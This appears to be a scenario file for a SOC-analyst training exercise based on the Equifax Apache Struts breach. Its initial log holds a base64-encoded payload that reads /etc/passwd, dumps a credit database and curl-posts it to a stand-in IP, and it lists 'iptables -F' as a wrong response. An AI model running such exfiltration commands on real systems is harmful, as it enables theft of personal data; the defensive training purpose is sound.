title: Equifax Data Breach
storyIntro: You are a SOC analyst. An alert indicates massive egress of unencrypted PII data. Attackers exploited an unpatched Apache Struts vulnerability to access the dispute portal and are exfiltrating credit records.
brief: An unpatched Apache Struts vulnerability has exposed primary consumer databases. Threat actors are running bulk data queries on sensitive records.
initialLogs: [ERROR] WAF bypass detected via Content-Type header. Exploit script payload: IyBBcGFjaGUgU3RydXRzIFJlbW90ZSBTaGVsbCBFeHBsb2l0IChDVkUtMjAxNy01NjM4KQ0Kd2hvYW1pOw0KY2F0IC9ldGMvcGFzc3dkOw0KcGdfZHVtcCAtVSByb290IGNvbnN1bWVyX2NyZWRpdF9kYXRhYmFzZSA+IC90bXAvY3JlZGl0X2R1bXAuc3FsOw0KY3VybCAtWCBQT1NUIC1GICJkYXRhPUBsdG1wL2NyZWRpdF9kdW1wLnNxbCIgaHR0cDovLzE5OC41MS4xMDAuNzIvdXBsb2FkOw==

agents.name: Manager
agents.message: Are they taking SSNs? Stop the bleeding immediately.

agents.name: Teammate
agents.message: I see weird OGNL expressions in the Apache logs.

evolving_logs: [CRITICAL] SQL queries timing out due to high load
[WARNING] New OGNL expressions targeting Struts configuration

incorrect_action_consequences.iptables -F: All firewall rules cleared, allowing free exfiltration.

Manager.catchphrase: Cost is no object - kill this now!

CTO.catchphrase: We need to understand what went wrong at each layer

scenario_specific_outputs.tail -f /var/log/mysql/mysql.log: 2023-10-15T14:35:01.654321Z 12345 Query SELECT * FROM credit_records WHERE customer_id = '123456789'
